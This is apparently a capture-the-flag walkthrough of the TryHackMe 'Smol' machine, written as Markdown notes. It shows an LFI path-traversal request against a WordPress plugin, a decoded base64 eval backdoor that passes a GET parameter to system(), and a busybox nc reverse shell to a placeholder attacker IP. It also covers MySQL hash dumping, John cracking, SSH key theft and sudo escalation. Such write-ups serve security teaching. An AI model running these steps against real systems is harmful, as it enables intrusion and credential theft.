---
tags:
  - THM
  - Linux
  - Medium
  - CMS
  - LFI
  - Leakage
  - RCE
  - Brute-Force
  - Sudo
---
https://tryhackme.com/room/smol/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.201.5.186 smol.thm www.smol.thm
```
Found subdomain `www.smol.thm` because the website redirects to it.
# Scanning
```console
$ nmap -p22,80 -sV -sC smol.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1c:f8:5c:4c:22:b1:d0:45:04:ce:19:e1:7c:15:91:50 (RSA)
|   256 59:48:6f:55:1c:7d:16:77:31:cb:eb:41:a7:c6:21:38 (ECDSA)
|_  256 5b:f6:80:76:35:97:9f:54:ba:7a:67:2f:76:1e:4f:4f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
The website is a hacking blog made with WordPress.
# Exploitation
## File Inclusion
Found [JSmol2WP](https://github.com/wp-plugins/jsmol2wp) WordPress plugin:
```console
$ curl -s 'http://www.smol.thm/' | grep plugins

<script src="http://www.smol.thm/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09" id="jsmol.min.nojq-js"></script>
```
Current version (<=1.07) is [vulnerable to LFI](https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654):
```console
$ curl -s 'http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt' | head

=== JSmol2WP ===
Contributors: Jim Hu
Tags: shortcodes, JSmol, Jmol, molecular graphics, PDB
Requires at least: 3.0
Tested up to: 4.9.4
Donate link:http://biochemistry.tamu.edu/index.php/alum/giving/
Stable tag: 1.07
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html
Text domain:jsmol2wp
```
Abuse LFI to get **wpuser credentials**:
```console
$ curl -s 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-config.php' | grep -C 3 -i password

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```
## RCE
Logged in at `/wp-login.php` with **leaked credentials**.

At `/index.php/to-do/`, found a task to-do-list which explains that a backdoor is present inside the [Hello Dolly plugin](https://github.com/WordPress/hello-dolly):
```txt
1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of “Hello Dolly” plugin as the site’s code revision.

2- ...
```
Found the backdoor code inside the `hello.php` file by abusing LFI again:
```console
$ curl -s 'http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../hello.php'

...
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
...
```
Decode the instructions:
```console
$ base64 -d <<< 'CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }

$ printf '\143\155\x64 \143\x6d\144'
cmd cmd
```
Listen for connections:
```bash
nc -lvnp <PORT>
```
Get command (**CMD**) to execute:
```bash
ip='<ATTACKER-IP>'
port='<PORT>'

echo -n "busybox nc $ip $port -e sh" | urlencode -a
```
As **wpuser**, establish a connection by visiting `/wp-admin/index.php?cmd=<CMD>`.
# Post-Exploitation
## Brute-Forcing MySQL
Found many users:
```console
$ grep 'sh$' /etc/passwd

root:x:0:0:root:/root:/usr/bin/bash
think:x:1000:1000:,,,:/home/think:/bin/bash
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
ssm-user:x:1004:1006::/home/ssm-user:/bin/sh
ubuntu:x:1005:1008:Ubuntu:/home/ubuntu:/bin/bash
```
After checking the website's files and open ports, we know that [MySQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html) is running:
```console
$ ss -tulnp | awk '{print $5}'

Local
127.0.0.53%lo:53
10.201.5.186%ens5:68
127.0.0.1:33060
0.0.0.0:22
127.0.0.53%lo:53
127.0.0.1:3306
[::]:22
*:80
```
Found **hashed passwords** for users:
```console
$ run_sql() { mysql -B -N -u'wpuser' -p'kbLSF2Vop#lw3rjDZ629*Z%G' -e "$1" 2>/dev/null; }

$ run_sql "SHOW DATABASES;"
information_schema
mysql
performance_schema
sys
wordpress

$ run_sql "SHOW TABLES FROM wordpress;" | grep user
wp_usermeta
wp_users
wp_wysija_email_user_stat
wp_wysija_email_user_url
wp_wysija_user
wp_wysija_user_field
wp_wysija_user_history
wp_wysija_user_list

$ run_sql "SELECT column_name FROM information_schema.columns WHERE table_name='wp_users';"
ID
user_login
user_pass
user_nicename
user_email
user_url
user_registered
user_activation_key
user_status
display_name

$ run_sql "SELECT CONCAT(user_login, ':', user_pass) FROM wordpress.wp_users;" | tee users.hash
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```
In the attacker's machine, cracked **diego's password** with John:
```console
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass users.hash

sandiegocalifornia (diego)
```
Migrated to **user diego** and got the **user flag**:
```console
$ su diego
Password:

$ cat /home/diego/user.txt
```
## Double User Migration
We can read private SSH key of **user think**:
```console
$ find /home -readable -type f 2>/dev/null

/home/gege/.profile
/home/gege/.bashrc
/home/gege/.bash_logout
/home/ssm-user/.profile
/home/ssm-user/.bashrc
/home/ssm-user/.bash_logout
/home/ubuntu/.profile
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout
/home/xavi/.profile
/home/xavi/.bashrc
/home/xavi/.bash_logout
/home/think/.profile
/home/think/.bashrc
/home/think/.bash_logout
/home/think/.ssh/id_rsa
/home/think/.ssh/authorized_keys
/home/think/.ssh/id_rsa.pub
/home/diego/.profile
/home/diego/.bashrc
/home/diego/.bash_logout
/home/diego/user.txt
```
Save `/home/think/.ssh/id_rsa` file and connect from the attacker's machine as **user think**:
```console
$ chmod 600 id_rsa

$ ssh think@smol.thm -i id_rsa
```
After huge enumeration, found that we can migrate to **user gege** without password according to PAM's configuration:
```console
$ cat /etc/pam.d/su
...
# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
...

$ su gege
```
## Cracking ZIP
Found a protected ZIP file containing the old WordPress website:
```console
$ cd

$ ls
wordpress.old.zip

$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password:
```
Transfer the file and use John to crack the password:
```console
$ zip2john wordpress.old.zip > zip.hash

$ john --wordlist=/usr/share/dict/rockyou.txt zip.hash
hero_gege@hotmail.com (wordpress.old.zip)
```
Found **xavi's password** inside an old settings file:
```console
$ unzip wordpress.old.zip

$ cd wordpress.old

$ cat wp-config.php
...
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
...
```
## Privilege Escalation
**User xavi** can run any command as any user using `sudo`, so become **root**:
```console
$ su xavi
Password:

$ sudo -l
Matching Defaults entries for xavi on ip-10-201-5-186:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on ip-10-201-5-186:
    (ALL : ALL) ALL

$ sudo su
```
Get the **root flag**:
```bash
cat /root/root.txt
```